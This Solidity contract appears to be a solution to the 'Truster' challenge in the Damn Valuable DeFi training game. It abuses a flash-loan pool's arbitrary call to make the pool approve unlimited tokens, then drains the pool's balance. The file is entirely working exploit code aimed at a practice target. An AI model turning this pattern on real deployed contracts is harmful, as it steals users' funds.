// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract TrusterAttack {
    ITrusterLenderPool public pool;
    DamnValuableToken public token;

    constructor(address _pool, address _token) {
        pool = ITrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
